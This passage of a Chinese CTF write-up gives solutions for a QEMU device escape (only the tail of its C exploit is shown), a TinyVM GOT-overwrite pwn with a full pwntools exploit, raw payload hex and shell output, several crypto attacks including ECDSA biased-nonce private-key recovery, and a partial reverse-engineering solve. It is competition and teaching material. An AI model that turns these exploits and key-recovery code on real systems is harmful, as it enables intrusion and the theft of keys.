    fprintf(stderr, "[+] leak cookie=0x%016" PRIx64 " timer_cb=0x%016" PRIx64 " state=0x%016" PRIx64 "\n",
            cookie, timer_cb, state);

    if (cookie != 0x4b434f544b434954ULL) {
        fprintf(stderr, "[-] bad cookie leak\n");
        return 1;
    }

    uint64_t qemu_base  = timer_cb - OFF_TT_TIMER_CB;
    uint64_t system_plt = qemu_base + OFF_SYSTEM_PLT;
    uint64_t cmd_ptr    = state + CH1_BUF_OFF;

    fprintf(stderr, "[+] qemu_base =0x%016" PRIx64 "\n", qemu_base);
    fprintf(stderr, "[+] system@plt=0x%016" PRIx64 "\n", system_plt);
    fprintf(stderr, "[+] cmd_ptr   =0x%016" PRIx64 "\n", cmd_ptr);

    /*
     * Overwrite QEMUTimer:
     *   ch1.buf+0x218 == state+0x10b0 == dma_timer.cb
     *   ch1.buf+0x220 == state+0x10b8 == dma_timer.opaque
     */
    memset(page, 0, PAGE);
    q[0] = system_plt;
    q[1] = cmd_ptr;
    async_dma_oob(1, phys, TIMER_CB_FROM_CH1BUF, 16, DIR_GUEST_TO_DEV);
    fprintf(stderr, "[+] overwritten timer callback, arming final timer...\n");

    /*
     * timer_mod() does not reset cb/opaque. When it expires, QEMU calls:
     *   system(cmd_ptr)
     */
    select_ch(1);
    set_dma(phys, 0, 1, DIR_DEV_TO_GUEST);
    wr32(REG_DELAY, 1);
    wr32(REG_ARM, 1);

    sleep(1);
    return 0;
}

```

## 3.VM
程序本体是 64 位 ELF，`No PIE`，`Partial RELRO`，`NX enabled`，有 `Canary`。因为不是直接栈溢出劫持返回地址，所以保护基本不构成阻碍，关键是把 VM 指令语义看明白。

VM 里有一种“指针寄存器”类型，`make_ptr` 拿到的是 VM 栈上的某个地址。正常情况下题目作者想让它只能在 VM 栈附近工作，但后面的算术指令 `add/sub` 只是改寄存器里的数值，不会把这个寄存器从 pointer 类型降回普通整数。这样就有一个很关键的洞：先 `make_ptr` 得到 VM 栈指针，再通过 `add/sub` 加上任意偏移，就能把这个 pointer reg 偏移到程序任意可读写地址，后续再配合 `load/store/store8` 就是任意读写。

本题里直接用这个原语打 GOT 就够了。已知 VM 栈基址是 `0x4050c0`，`printf@got` 是 `0x405028`，`puts@got` 是 `0x405018`。先把 pointer reg 从 `0x4050c0` 偏移到 `printf@got`，读出真实 `printf` 地址，再利用题目给的 `libc.so.6` 中偏移 `system - printf = 0x50d70 - 0x606f0` 算出 `system`。然后再把 pointer reg 偏移到 `puts@got`，把它改写成 `system`。最后在 VM 栈上写入 `/bin/sh\x00`，调用原本的 `puts("/bin/sh")`，实际就变成了 `system("/bin/sh")`。

利用链非常短，整体 payload 长度只有 `150` 字节。

利用步骤可以概括成下面几步：

```latex
1. ptr(0, 0)                    -> r0 = VM stack pointer
2. imm/add                      -> r0 = &printf@got
3. load                         -> r2 = printf@libc
4. imm/add                      -> r2 = system@libc
5. ptr + imm/add                -> r0 = &puts@got
6. store                        -> puts@got = system
7. ptr(0, 0x80) + store8        -> 在 VM 栈写 "/bin/sh\x00"
8. call_puts(r0)                -> system("/bin/sh")
```

exp 如下，远端直接可打：

```python
from pwn import *
import struct

context.arch = "amd64"

STACK      = 0x4050c0
PRINTF_GOT = 0x405028
PUTS_GOT   = 0x405018

PRINTF_OFF = 0x606f0
SYSTEM_OFF = 0x50d70

def p32s(x):
    return struct.pack("<i", x)

def imm(r, x):      return bytes([0x10, r]) + p32s(x)
def add(a, b):      return bytes([0x20, a, b])
def ptr(r, off):    return bytes([0x30, r, off & 0xff])
def load(d, p):     return bytes([0x31, d, p])
def store(p, s):    return bytes([0x32, p, s])
def store8(p, s):   return bytes([0x34, p, s])
def call_puts(r):   return bytes([0x60, r])

code = b""

code += ptr(0, 0)
code += imm(1, PRINTF_GOT - STACK)
code += add(0, 1)

code += load(2, 0)
code += imm(1, SYSTEM_OFF - PRINTF_OFF)
code += add(2, 1)

code += ptr(0, 0)
code += imm(1, PUTS_GOT - STACK)
code += add(0, 1)

code += store(0, 2)

code += ptr(0, 0x80)
code += imm(1, 1)

for c in b"/bin/sh\x00":
    code += imm(2, c)
    code += store8(0, 2)
    code += add(0, 1)

code += ptr(0, 0x80)
code += call_puts(0)
code += b"\xff"

print("payload len =", len(code))

io = remote("0594f7ba.tcp-ctf2.dasctf.com", 9999, ssl=True)
io.sendlineafter(b"Size: ", str(len(code)).encode())
io.send(code)
io.sendline(b"cat /flag")
io.interactive()
```

裸 payload hex：

```latex
300000100168ffffff20000131020010018006ffff200201300000100158ffffff20000132000230008010010100000010022f00000034000220000110026200000034000220000110026900000034000220000110026e00000034000220000110022f0000003400022000011002730000003400022000011002680000003400022000011002000000003400022000013000806000ff
```

本地验证时，直接用附件里的 `ld-linux-x86-64.so.2` 和 `libc.so.6` 启动程序即可。因为本地进程本身是普通用户权限，所以起出来的是当前用户 shell，不会显示 `uid=0`，这一点和远端容器/root 环境是否提权无关，只说明 `system("/bin/sh")` 已经成功执行。

```bash
cd /mnt/e/CTF/比赛/das/pwn/TinyVM/tempdir/PWN附件/TinyVM
python3 exp_local.py
```

本地回显是：

```latex
Size: uid=1000(jerry) gid=1000(jerry) groups=...
jerry
sh: 1: Done.: not found
payload len = 150
```

`sh: 1: Done.: not found` 是正常现象，因为 `puts@got` 被改成了 `system`，程序退出前原本会调用一次 `puts("Done.")`，现在就变成了 `system("Done.")`。

远端打通后，`/flag` 可以直接读出，最终 flag 为：

```latex
DASCTF{46f722e9-3442-4874-a55e-7693331ae762}
```

# crypto
## three_friends
题目给出了一个 RSA 加密脚本。flag 被平均切成三段，分别转换为整数 `m1`、`m2`、`m3` 后加密。

```python
L = len(flag)
m1 = bytes_to_long(flag[:L//3])
m2 = bytes_to_long(flag[L//3:2*L//3])
m3 = bytes_to_long(flag[2*L//3:])

p = getPrime(512)
q = getPrime(512)
r = getPrime(512)

e = 65537

n1 = p * q
n2 = q * r
n3 = p * r

c1 = pow(m1, e, n1)
c2 = pow(m2, e, n2)
c3 = pow(m3, e, n3)
```

#### 漏洞分析
正常 RSA 中，不同用户的模数 `n` 应该由互不相同的素数生成。但本题中三个模数两两共享素因子：

```latex
n1 = p * q
n2 = q * r
n3 = p * r
```

因此可以通过最大公约数直接分解出三个素数：

```python
q = gcd(n1, n2)
p = gcd(n1, n3)
r = gcd(n2, n3)
```

原因如下：

```latex
gcd(n1, n2) = gcd(pq, qr) = q
gcd(n1, n3) = gcd(pq, pr) = p
gcd(n2, n3) = gcd(qr, pr) = r
```

拿到 `p`、`q`、`r` 后，就可以分别计算每组 RSA 的欧拉函数：

```python
phi1 = (p - 1) * (q - 1)
phi2 = (q - 1) * (r - 1)
phi3 = (p - 1) * (r - 1)
```

然后计算私钥指数：

```python
d1 = inverse(e, phi1)
d2 = inverse(e, phi2)
d3 = inverse(e, phi3)
```

最后解密三段密文并拼接：

```python
m1 = pow(c1, d1, n1)
m2 = pow(c2, d2, n2)
m3 = pow(c3, d3, n3)
flag = long_to_bytes(m1) + long_to_bytes(m2) + long_to_bytes(m3)
```

#### exp
```python
import re
import math
from pathlib import Path

def long_to_bytes(x: int) -> bytes:
    """Convert integer to big-endian bytes."""
    if x == 0:
        return b"\x00"
    return x.to_bytes((x.bit_length() + 7) // 8, "big")

def load_values_from_task(path: str = "task.py") -> dict:
    """Parse n1, n2, n3, e, c1, c2, c3 from task.py if it exists."""
    text = Path(path).read_text(encoding="utf-8")
    pairs = re.findall(r"\b(n1|n2|n3|e|c1|c2|c3)\s*=\s*(\d+)", text)
    values = {k: int(v) for k, v in pairs}

    required = {"n1", "n2", "n3", "e", "c1", "c2", "c3"}
    missing = required - values.keys()
    if missing:
        raise ValueError(f"missing values in {path}: {', '.join(sorted(missing))}")

    return values

def default_values() -> dict:
    """Hardcoded challenge values."""
    return {
        "n1": 110479112338979326841231465480900311437095583241804968504367003268478785311645575853029227541889465070127417880290972698509502098875302777600751062235679028180932171554996023850242418398546147652141811910224228666917788640895453721648601609529326886128507435254380985821439510394329605362511800619781782498829,
        "n2": 95225891725804035729098697183853172993650305271540351260130976375990969994680256179992972429701670943885218431291657615581872984046365977866046911929212400122026478512046580419614160900113488336302811792780327677539930592604198331529856760869923384410189400614767668529075682332352478496830621674767765967989,
        "n3": 111603865467493745511917065096450766019551858630764507502030413922630178420561431122201021143404521026218410173550594126191240832822627851633700772093095150654117699219949636045712687320990198957564564857885138504872560550777788915442814980338401072475446362026076893466520135409327492048388030114969050367401,
        "e": 65537,
        "c1": 83456548767677952158133165776385438048214812740470347872014544040241661979735585698444752238351578159480247608435786172021153411975720140472715451216442036398970558532828923787921375318802867775369825882219621531795085442575971814645729572790836415339290407608988460626504016819536559945368010686567075802413,
        "c2": 55598291653542627898994967211126815679185160762475277667203320398466974811147081936849639204784572327753766773503264941715352990434513737784771805183050575481575095545922660276426069697449001567347723946016416649932633528235458091960122921036028416845355866656581114844470311590282808396786169332755296721792,
        "c3": 99617304265145206462280689337024202287720390645940568836285315412577937662785727570612881726190729195621460858194592258472873348744392240254689998279616123901037173010035977506212880680604466077172284894508163086916852071659627506881093976971048133795462670278664801263633610021626528113016267024450025017002,
    }

def decrypt_part(c: int, e: int, a: int, b: int, n: int) -> bytes:
    phi = (a - 1) * (b - 1)
    d = pow(e, -1, phi)
    m = pow(c, d, n)
    return long_to_bytes(m)

def main() -> None:
    try:
        values = load_values_from_task("task.py")
    except Exception:
        values = default_values()

    n1, n2, n3 = values["n1"], values["n2"], values["n3"]
    e = values["e"]
    c1, c2, c3 = values["c1"], values["c2"], values["c3"]

    # Recover shared primes.
    q = math.gcd(n1, n2)
    p = math.gcd(n1, n3)
    r = math.gcd(n2, n3)

    assert p * q == n1
    assert q * r == n2
    assert p * r == n3

    m1 = decrypt_part(c1, e, p, q, n1)
    m2 = decrypt_part(c2, e, q, r, n2)
    m3 = decrypt_part(c3, e, p, r, n3)

    flag = m1 + m2 + m3
    print(flag.decode())

if __name__ == "__main__":
    main()
```

运行结果：
```
DASCTF{thr33_fri3nds_sh@r3_pr1m3s!!}
```

## lattice_oracle
题目给出了一个小参数 LWE 形式的加密脚本：

```python
n = 6
q = 97
m = 30

s = [random.randint(0, 3) for _ in range(n)]

for _ in range(m):
    a_i = [random.randint(0, q - 1) for _ in range(n)]
    e_i = random.randint(-1, 1)
    b_i = (sum(x * y for x, y in zip(a_i, s)) + e_i) % q
```

其中：

+ `n = 6`
+ `q = 97`
+ `m = 30`
+ 秘密向量 `s` 的每一位都在 `0 ~ 3`
+ 误差 `e_i` 只可能是 `-1, 0, 1`
+ AES 密钥由 `s` 派生：

```python
key = hashlib.sha256(str(s).encode()).digest()[:16]
```

最终使用 AES-CBC 加密 flag。

#### 漏洞分析
LWE 通常依赖较大的维度和较大的秘密空间来保证安全性。

但本题中秘密向量非常小：

```python
s[i] ∈ {0, 1, 2, 3}
n = 6
```

因此总搜索空间只有：

```latex
4^6 = 4096
```

这个规模可以直接爆破。

对任意候选秘密向量 `s`，可以计算：

```python
pred = sum(a_i[j] * s[j] for j in range(n)) % q
```

真实的 `b_i` 满足：

```python
b_i = pred + e_i mod q
```

而 `e_i ∈ {-1, 0, 1}`。

所以：

```python
diff = (b_i - pred) % q
```

合法时只可能为：

```latex
0, 1, 96
```

其中 `96` 表示模 `97` 下的 `-1`。

只要某个候选 `s` 对所有 30 条样本都满足该条件，就可以确定它是真正的秘密向量。

#### 恢复秘密向量
枚举所有候选：

```python
for s in product(range(4), repeat=6):
    ...
```

最终得到：

```latex
s = [0, 0, 2, 1, 1, 1]
```

#### 解密 flag
根据题目脚本中的密钥派生方式：

```python
key = hashlib.sha256(str(s).encode()).digest()[:16]
```

然后使用题目给出的 `iv` 和 `enc` 做 AES-CBC 解密，最后去除 PKCS#7 padding。

解密结果为：

```latex
DASCTF{LWE_l4tt1c3_r3duct10n_i5_p0w3rful!}
```

`task.py` 注释中的数据和 `data.txt` 中的数据有一处不一致：

```latex
task.py 第 15 行 A 的第一个元素为 77
data.txt 第 15 行 A 的第一个元素为 7
```

但最终恢复出的秘密向量满足：

```latex
s[0] = 0
```

因此该位置的系数无论是 `77` 还是 `7`，乘上 `s[0]` 后都为 `0`，不会影响最终结果。

#### exp
```python
import json
import hashlib
from itertools import product
from pathlib import Path
from Crypto.Cipher import AES

DEFAULT_DATA = {
    "n": 6,
    "q": 97,
    "m": 30,
    "A": [
        [94, 13, 86, 94, 69, 11],
        [54, 4, 3, 11, 27, 29],
        [77, 3, 71, 25, 91, 83],
        [69, 53, 28, 57, 75, 35],
        [20, 89, 54, 43, 35, 19],
        [43, 13, 11, 48, 12, 45],
        [77, 33, 5, 93, 58, 68],
        [48, 10, 70, 37, 80, 79],
        [73, 24, 90, 8, 5, 84],
        [37, 10, 29, 12, 48, 35],
        [81, 46, 20, 47, 45, 26],
        [34, 89, 87, 82, 9, 77],
        [21, 68, 93, 31, 20, 59],
        [34, 81, 88, 71, 28, 87],
        [7, 29, 4, 40, 51, 34],
        [27, 72, 91, 40, 27, 83],
        [50, 82, 58, 18, 33, 17],
        [95, 71, 68, 33, 95, 74],
        [74, 51, 46, 28, 17, 65],
        [11, 96, 6, 14, 19, 80],
        [87, 54, 76, 8, 49, 48],
        [59, 67, 32, 70, 1, 87],
        [14, 87, 68, 96, 34, 82],
        [14, 37, 55, 20, 58, 0],
        [92, 33, 64, 22, 64, 13],
        [38, 81, 64, 77, 25, 19],
        [20, 69, 67, 0, 76, 41],
        [2, 14, 46, 39, 30, 7],
        [72, 10, 10, 93, 62, 8],
        [16, 16, 84, 60, 70, 21],
    ],
    "b": [
        56, 74, 51, 28, 10, 30, 34, 45, 82, 56,
        62, 52, 5, 71, 35, 41, 86, 47, 8, 27,
        64, 29, 57, 92, 34, 55, 57, 70, 87, 28
    ],
    "iv": "bcdad772f7a0ec967887f7b8f36234c8",
    "enc": "00ac1bac207e84d91c6243c4aead3576a20f996a5420eea7bfa0df3b61d68c83f283bd31f1fedf7465b6445d7a58dcdc",
}

def load_data():
    path = Path("data.txt")
    if path.exists():
        with path.open("r", encoding="utf-8") as f:
            return json.load(f)
    return DEFAULT_DATA

def recover_secret(A, b, n, q):
    for cand in product(range(4), repeat=n):
        s = list(cand)
        ok = True

        for ai, bi in zip(A, b):
            pred = sum(x * y for x, y in zip(ai, s)) % q
            diff = (bi - pred) % q

            # e in {-1, 0, 1}
            if diff not in (q - 1, 0, 1):
                ok = False
                break

        if ok:
            return s

    raise ValueError("secret vector not found")

def pkcs7_unpad(data):
    pad = data[-1]
    if pad < 1 or pad > 16:
        raise ValueError("invalid padding")
    if data[-pad:] != bytes([pad]) * pad:
        raise ValueError("invalid padding")
    return data[:-pad]

def main():
    data = load_data()

    n = data["n"]
    q = data["q"]
    A = data["A"]
    b = data["b"]
    iv = bytes.fromhex(data["iv"])
    enc = bytes.fromhex(data["enc"])

    s = recover_secret(A, b, n, q)
    print("[+] secret =", s)

    key = hashlib.sha256(str(s).encode()).digest()[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(enc)
    flag = pkcs7_unpad(pt)

    print("[+] flag =", flag.decode())

if __name__ == "__main__":
    main()
```

运行结果：

```
[+] secret = [0, 0, 2, 1, 1, 1]

[+] flag = DASCTF{LWE_l4tt1c3_r3duct10n_i5_p0w3rful!}
```

## phantom_sign
#### 漏洞分析
题目使用的是 secp256k1 曲线，签名逻辑为标准 ECDSA：

```python
h_i = int(hashlib.sha256(msg).hexdigest(), 16) % n
k_i = bytes_to_long(os.urandom(31))
R_i = point_mul(k_i, G)
r_i = R_i[0] % n
s_i = inv_mod(k_i, n) * (h_i + d * r_i) % n
```

ECDSA 签名满足：

```latex
s_i * k_i = h_i + d * r_i  (mod n)
```

也就是：

```latex
k_i = s_i^(-1) * r_i * d + s_i^(-1) * h_i  (mod n)
```

令：

```latex
a_i = r_i * s_i^(-1) mod n
b_i = h_i * s_i^(-1) mod n
```

则有：

```latex
k_i = a_i * d + b_i  (mod n)
```

问题出在 nonce 的生成：

```python
k_i = bytes_to_long(os.urandom(31))
```

`os.urandom(31)` 只生成 31 字节随机数，所以：

```latex
k_i < 2^248
```

但 secp256k1 的阶 `n` 接近 `2^256`，因此每个 nonce 的最高 8 bit 恒为 0。这是典型的 ECDSA biased nonce / Hidden Number Problem，可以用 LLL 格攻击恢复私钥 `d`。

#### 格攻击思路
由于：

```latex
k_i = a_i * d + b_i - t_i * n
```

其中 `k_i` 很小，`d` 是未知私钥，`t_i` 是某个整数。我们可以构造格，使得包含 `k_i` 的向量成为短向量，随后用 LLL 规约找到它。

因为 `k_i < 2^248`，而 `n ≈ 2^256`，这里使用缩放因子：

```latex
X = 2^8
```

构造矩阵：

```latex
[nX, 0,  0,  ..., 0,  0, 0]
[0,  nX, 0,  ..., 0,  0, 0]
[0,  0,  nX, ..., 0,  0, 0]
...
[a1X,a2X,a3X,...,amX,1, 0]
[b1X,b2X,b3X,...,bmX,0, n]
```

对该矩阵做 LLL 规约后，在短向量中寻找最后一维为 `±n` 的向量，其倒数第二维即可恢复出 `±d`。恢复候选私钥后，再用公钥 `Q = dG` 验证即可。

#### 解密得到flag
题目中 AES key 的派生方式为：

```python
key = hashlib.sha256(long_to_bytes(d)).digest()[:16]
```

因此恢复私钥后，直接使用 AES-CBC 解密：

```python
AES.new(key, AES.MODE_CBC, iv).decrypt(enc)
```

再去除 PKCS#7 padding 即可得到 flag。

#### exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
phantom_sign exp

ECDSA biased nonce attack on secp256k1.
The nonce is generated by os.urandom(31), so every nonce k < 2^248.
With 40 signatures, recover the private key by HNP + LLL, then decrypt AES-CBC.

Usage:
    python3 exp.py data.json
"""

import json
import hashlib
import sys
from pathlib import Path
from sympy import Matrix

def long_to_bytes(x: int) -> bytes:
    x = int(x)
    return x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")

def pkcs7_unpad(buf: bytes, block_size: int = 16) -> bytes:
    if not buf:
        raise ValueError("empty plaintext")
    pad_len = buf[-1]
    if pad_len < 1 or pad_len > block_size:
        raise ValueError("bad padding length")
    if buf[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("bad padding bytes")
    return buf[:-pad_len]

def aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
    """Use pycryptodome if available, otherwise use cryptography."""
    try:
        from Crypto.Cipher import AES
        return AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    except Exception:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
        return dec.update(ct) + dec.finalize()

def inv_mod(x: int, m: int) -> int:
    return pow(int(x), -1, int(m))

def point_add(P, Q, p, a):
    if P is None:
        return Q
    if Q is None:
        return P

    x1, y1 = P
    x2, y2 = Q

    if x1 == x2 and (y1 + y2) % p == 0:
        return None

    if P == Q:
        lam = (3 * x1 * x1 + a) * inv_mod(2 * y1, p) % p
    else:
        lam = (y2 - y1) * inv_mod(x2 - x1, p) % p

    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    return (x3, y3)

def point_mul(k: int, P, p, a):
    R = None
    Q = P
    k = int(k)
    while k > 0:
        if k & 1:
            R = point_add(R, Q, p, a)
        Q = point_add(Q, Q, p, a)
        k >>= 1
    return R

def recover_private_key(data: dict) -> int:
    curve = data["curve"]
    n = int(curve["n"])
    p = int(curve["p"])
    a = int(curve["a"])
    G = (int(curve["Gx"]), int(curve["Gy"]))
    pub = tuple(map(int, data["Q"]))

    sigs = data["signatures"]
    m = len(sigs)

    # ECDSA: s*k = h + d*r (mod n)
    # => k = (r/s)*d + (h/s) (mod n)
    A = []
    B = []
    for h, r, s in sigs:
        h, r, s = int(h), int(r), int(s)
        inv_s = inv_mod(s, n)
        A.append((r * inv_s) % n)
        B.append((h * inv_s) % n)

    # Since k is generated from 31 bytes, k < 2^248.
    # secp256k1 order n is about 2^256, so 8 MSBs of every nonce are known to be zero.
    # Scale by X = 2^8 to make k*X small enough for LLL to detect.
    X = 2 ** 8
    M = n

    rows = []
    for i in range(m):
        row = [0] * (m + 2)
        row[i] = n * X
        rows.append(row)

    rows.append([(x * X) % (n * X) for x in A] + [1, 0])
    rows.append([(x * X) % (n * X) for x in B] + [0, M])

    L = Matrix(rows).lll(delta=0.99)

    candidates = set()
    for row in L.tolist():
        # In the expected short vector, the last coordinate is +/-n,
        # and the second-last coordinate reveals +/-d.
        if int(row[-1]) == M:
            candidates.add(int(row[-2]) % n)
        elif int(row[-1]) == -M:
            candidates.add((-int(row[-2])) % n)

    for d in candidates:
        if point_mul(d, G, p, a) == pub:
            return d

    raise RuntimeError("private key not found; try checking the lattice construction or dependencies")

def main():
    data_path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("data.json")
    with data_path.open("r", encoding="utf-8") as f:
        data = json.load(f)

    d = recover_private_key(data)
    key = hashlib.sha256(long_to_bytes(d)).digest()[:16]
    iv = bytes.fromhex(data["iv"])
    enc = bytes.fromhex(data["enc"])

    pt = aes_cbc_decrypt(key, iv, enc)
    flag = pkcs7_unpad(pt, 16)

    print("[+] private key d =", d)
    print("[+] AES key       =", key.hex())
    print("[+] flag          =", flag.decode())

if __name__ == "__main__":
    main()
```

运行结果：
```
[+] private key d = 69733894115169365517439430123407937761015055472912247236884018827222720875663

[+] AES key       = efd5ddcc04c780788bac3710aa6fb4c4

[+] flag          = DASCTF{3cd5a_b1as3d_n0nc3_HNP_l4tt1c3_4ttack!}
```
# reverse
## Mirage
```
真实与幻象之间，只隔着一层薄纱
```
#### 主逻辑分析
主函数会先输出：

```latex
Enter flag:
```

然后读取输入，去掉末尾换行后判断长度：

```plain
4012df: cmp rax, 0x26
4012e3: je  401312
```

所以 flag 长度必须为：

```latex
0x26 = 38
```

后面程序调用了 `mprotect`，并且出现了 `fork`、`ptrace`、`waitpid`，说明题目存在动态自修改代码。父进程负责监控子进程，子进程先执行：

```plain
ptrace(PTRACE_TRACEME, 0, 0, 0)
int3
```

父进程捕获 `SIGTRAP` 后，用 `ptrace(PTRACE_PEEKDATA)` 读取子进程 `stage2` 代码，再异或写回，实现运行时解密。

#### stage2 解密 key：输入前 8 字节
父进程解密 `stage2` 的核心逻辑如下：

```plain
40138d: mov rax, [rsp+0x100]      ; 输入前 8 字节
4013d6: call ptrace               ; PEEKDATA 读取 stage2 qword
4013db: xor rax, [rsp+0x8]        ; 和输入前 8 字节异或
4013f2: call ptrace               ; POKEDATA 写回
```

也就是说：

```latex
stage2_plain = stage2_enc xor flag[0:8]
```

`stage2` 解密后应该是正常函数。观察普通函数头可知开头大概率为：

```latex
f3 0f 1e fa 55 53 48 83
```

即：

```plain
endbr64
push rbp
push rbx
sub rsp, ...
```

用密文前 8 字节异或该函数头，即可得到输入前 8 字节：

```latex
DASCTF{p
```

第一段 flag 为：

```latex
DASCTF{p
```

#### stage2 校验输入第 8 到 23 字节
用 `DASCTF{p` 作为 key 解开 `stage2` 后，可以得到如下核心逻辑：

```plain
mov dword ptr [rsp+0x10], 0x13375eed
mov dword ptr [rsp+0x14], 0xcafebabe
mov dword ptr [rsp+0x18], 0x8badf00d
mov dword ptr [rsp+0x1c], 0xfeedface

movdqu xmm0, xmmword ptr [rdi+0x8]
movaps xmmword ptr [rsp], xmm0

call 0x401216        ; 加密前 8 字节
call 0x401216        ; 加密后 8 字节
```

`stage2` 会取 `flag[8:24]` 共 16 字节，按 8 字节一组调用 `0x401216` 的加密函数。随后比较密文：

```plain
cmp dword ptr [rsp],     0xcb95449c
cmp dword ptr [rsp+0x4], 0xf7f975e4
cmp dword ptr [rsp+0x8], 0xdf22bf8b
cmp dword ptr [rsp+0xc], 0x6aadb19a
```

加密函数类似 TEA，但不是标准 TEA。核心伪代码如下：

```c
uint32_t delta = 0xDEADBEEF;
uint32_t sum = 0;

for (int i = 0; i < 48; i++) {
    sum += delta;

    v0 += ((sum + v1) ^ rol(v1, 13) ^ ((v1 << 4) + k0) ^ ((v1 >> 5) + k1));
    v1 += ((sum + v0) ^ rol(v0,  3) ^ ((v0 << 4) + k2) ^ ((v0 >> 5) + k3));
}
```

其中 key 为：

```latex
k0 = 0x13375eed
k1 = 0xcafebabe
k2 = 0x8badf00d
k3 = 0xfeedface
```

将比较用的两组密文反解：

```latex
0xcb95449c 0xf7f975e4 -> Tr4c3_s3
0xdf22bf8b 0x6aadb19a -> Lf_m0d1F
```

第二段 flag 为：

```latex
Tr4c3_s3Lf_m0d1F
```

#### stage3 解密与校验逻辑
`stage2` 校验成功后，会写入一个 64 位 key：

```plain
movabs rax, 0x5809623058096230
mov [rbx], rax
ud2
```

这里的 `ud2` 会触发 `SIGILL`。父进程捕获后，用这个 key 解密 `stage3`：

```plain
40150e: movabs r12, 0x5809623058096230
401531: call ptrace        ; PEEKDATA
401536: xor rax, r12
40154b: call ptrace        ; POKEDATA
```

同时父进程会把子进程 RIP 加 2，跳过 `ud2`，让程序继续执行解密后的 `stage3`。

解密后的 `stage3` 是一个 14×14 的线性方程组校验。它取：

```latex
flag[24:38]
```

然后做矩阵乘法并取低 8 位：

```c
for (int i = 0; i < 14; i++) {
    uint8_t s = 0;
    for (int j = 0; j < 14; j++) {
        s += matrix[i][j] * input[24 + j];
    }
    check[i] = s;
}
```

比较目标数组位于：

```latex
0x402040
```

矩阵位于：

```latex
0x402060
```

因此要求解：

```latex
matrix * x = target   mod 256
```

对模 256 做高斯消元，得到：

```latex
y_c0d3_m4G1c!}
```

第三段 flag 为：

```latex
y_c0d3_m4G1c!}
```

#### 合并结果
三段结果分别为：

```latex
part1 = DASCTF{p
part2 = Tr4c3_s3Lf_m0d1F
part3 = y_c0d3_m4G1c!}
```

合并得到：

```latex
DASCTF{pTr4c3_s3Lf_m0d1Fy_c0d3_m4G1c!}
```

#### exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mirage exp.py
Usage:
    python3 exp.py ./mirage

The script reproduces the offline solution:
1. Recover the first 8 bytes from the encrypted stage2 prologue.
2. Invert the 48-round modified TEA in stage2.
3. Solve the 14x14 linear system in stage3 modulo 256.
"""

import sys
from pathlib import Path

MASK32 = 0xFFFFFFFF
MOD = 256

# The challenge binary is a non-PIE ELF.
# For the executable LOAD segment, file offset = virtual address - 0x400000.
ELF_BASE = 0x400000

STAGE2_VA = 0x4015E0
STAGE3_VA = 0x401690
TARGET_VA = 0x402040
MATRIX_VA = 0x402060

def va_to_off(va: int) -> int:
    return va - ELF_BASE

def u32(x: int) -> int:
    return x & MASK32

def rol32(x: int, n: int) -> int:
    x &= MASK32
    return ((x << n) | (x >> (32 - n))) & MASK32

def inv_mod(a: int, mod: int = MOD) -> int:
    """Return modular inverse of a modulo mod."""
    a %= mod
    t, new_t = 0, 1
    r, new_r = mod, a
    while new_r:
        q = r // new_r
        t, new_t = new_t, t - q * new_t
        r, new_r = new_r, r - q * new_r
    if r != 1:
        raise ValueError(f"{a} has no inverse modulo {mod}")
    return t % mod

def solve_linear_mod_256(matrix, target):
    """Solve A*x=b over Z/256Z. The matrix has odd pivots, so it is invertible."""
    n = len(matrix)
    aug = [row[:] + [target[i]] for i, row in enumerate(matrix)]

    row = 0
    pivots = []
    for col in range(n):
        pivot = None
        for r in range(row, n):
            # Only odd numbers are invertible modulo 256.
            if aug[r][col] & 1:
                pivot = r
                break
        if pivot is None:
            continue

        aug[row], aug[pivot] = aug[pivot], aug[row]
        inv = inv_mod(aug[row][col], MOD)
        aug[row] = [(x * inv) % MOD for x in aug[row]]

        for r in range(n):
            if r == row:
                continue
            factor = aug[r][col] % MOD
            if factor:
                aug[r] = [(aug[r][c] - factor * aug[row][c]) % MOD for c in range(n + 1)]

        pivots.append(col)
        row += 1

    if len(pivots) != n:
        raise RuntimeError("linear system is not full-rank under modulo 256")

    ans = [0] * n
    for i, col in enumerate(pivots):
        ans[col] = aug[i][-1]
    return bytes(ans)

def tea_round_f(x: int, s: int, ka: int, kb: int, rot: int) -> int:
    return u32(
        u32(s + x)
        ^ rol32(x, rot)
        ^ u32((x << 4) + ka)
        ^ u32((x >> 5) + kb)
    )

def decrypt_modified_tea_block(v0: int, v1: int, key):
    """
    Invert the function at 0x401216.

    Encryption round in the binary:
        sum += 0xDEADBEEF
        v0 += f(v1, sum, k0, k1, rol=13)
        v1 += f(v0, sum, k2, k3, rol=3)

    The loop ends when sum == 0xC093CCD0, i.e. after 48 rounds.
    """
    delta = 0xDEADBEEF
    rounds = 48
    s = u32(delta * rounds)

    for _ in range(rounds):
        v1 = u32(v1 - tea_round_f(v0, s, key[2], key[3], 3))
        v0 = u32(v0 - tea_round_f(v1, s, key[0], key[1], 13))
        s = u32(s - delta)

    return v0.to_bytes(4, "little") + v1.to_bytes(4, "little")

def main():
    bin_path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("./mirage")
    data = bin_path.read_bytes()

    # stage2 is XOR-decrypted by the parent process with the first 8 input bytes.
    # The plaintext begins with a normal function prologue:
    #   f3 0f 1e fa 55 53 48 83    endbr64; push rbp; push rbx; sub rsp, ...
    expected_stage2_head = bytes.fromhex("f3 0f 1e fa 55 53 48 83")
    enc_stage2_head = data[va_to_off(STAGE2_VA):va_to_off(STAGE2_VA) + 8]
    part1 = bytes(a ^ b for a, b in zip(enc_stage2_head, expected_stage2_head))

    # stage2 decrypts and checks input[8:24] with a modified TEA-like algorithm.
    key = [0x13375EED, 0xCAFEBABE, 0x8BADF00D, 0xFEEDFACE]
    ct_blocks = [
        (0xCB95449C, 0xF7F975E4),
        (0xDF22BF8B, 0x6AADB19A),
    ]
    part2 = b"".join(decrypt_modified_tea_block(v0, v1, key) for v0, v1 in ct_blocks)

